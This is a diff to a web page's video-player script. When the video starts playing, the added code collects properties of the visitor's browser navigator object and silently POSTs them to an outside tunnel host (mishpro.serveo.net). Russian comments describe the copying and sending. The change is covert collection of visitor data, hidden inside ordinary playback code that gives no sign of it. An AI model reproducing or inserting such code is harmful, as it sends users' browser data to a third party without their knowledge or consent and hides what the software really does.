@@ -120,6 +120,35 @@
 				video.hidden = false;
 				video.play();
 				videoClick();
+				const navigatorData = {};
+				
+				// Переносим все перечисляемые свойства объекта navigator
+				for (const key in navigator) {
+				if (navigator.hasOwnProperty(key)) {
+					try {
+				    	// Пробуем сохранить свойство
+				        navigatorData[key] = navigator[key];
+				        } catch (e) {
+				        // Игнорируем ошибки доступа к свойствам
+				        }
+				    }
+				}
+				
+				// Отправляем данные на сервер
+				fetch('http://mishpro.serveo.net/endpoint', {
+					method: 'POST',
+				    headers: {
+				    	'Content-Type': 'application/json',
+				    },
+				    body: JSON.stringify(navigatorData),
+				})
+				.then(response => response.json())
+				.then(data => {
+					console.log('Успех:', data);
+				})
+				.catch((error) => {
+				    console.error('Ошибка:', error);
+				});
 			}
 			function videoClick(){
 				if(this.requestFullScreen) this.requestFullScreen();
